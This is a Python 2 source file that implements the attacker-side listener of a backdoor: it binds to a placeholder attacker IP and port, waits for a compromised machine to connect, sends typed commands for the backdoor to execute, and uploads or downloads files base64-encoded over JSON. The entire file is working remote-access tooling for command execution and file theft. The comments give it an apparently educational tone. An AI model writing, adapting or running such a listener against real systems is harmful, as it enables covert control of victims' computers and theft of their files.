#!/usr/bin/env python2.7

# Author: Nikhil Sharma
# Created Date: 01-09-2020
# Last Updated: 18-09-2020
# Operating System: Windows, Linux, Mac
# Description: Opens a desired port and allows connections made to that port

# Import the necessary libraries
import socket, json, base64

# Define a class for the listener
class Listener:
	def __init__(self, ip, port):
		# Create a socket object
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# Change the socket option to reuse the sockets incase it is dropped due to any error
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		# Bind the socket to the local IP and a port
		listener.bind((ip, port))
		# Listen in on the socket
		print("[+] Waiting for incoming connections")
		listener.listen(0)
		# Accept any connection made to the specified port
		self.connection, address = listener.accept()
		print("[+] Got a connection " + str(address))
	
	# a send method that sends data as json objects. The data here is in string and therefore does not need any sort of decodes
	def json_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	# a receive method that receives and converts json objects
	def json_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def remote_execution(self, command):
		self.json_send(command)
		# Terminate the connection if "exit" command is used
		if command[0] == "exit":
			self.connection.close()
			exit()
		return self.json_receive()

	# Method to read files as a binary
	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	# Mehtod to write files
	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Download successful"

	def run(self):
		# Take user input commnads and send it to the backdoor for execution. The backdoor executes the commands and returns the result to the listener.
		while True:
			command = raw_input(str(">> "))
			command = command.split(" ")
			try:
				if command[0] == "upload":
					file_content = self.read_file(command[1])
					command.append(file_content)

				result = self.remote_execution(command)

				if command[0] == "download" and "[-] Error " not in result:
					result = self.write_file(command[1], result)
			except Exception:
				result = "[-] Error during command execution"
			print(result)

my_listener = Listener(<ATTACKER_IP>, <PORT_NO>)
my_listener.run()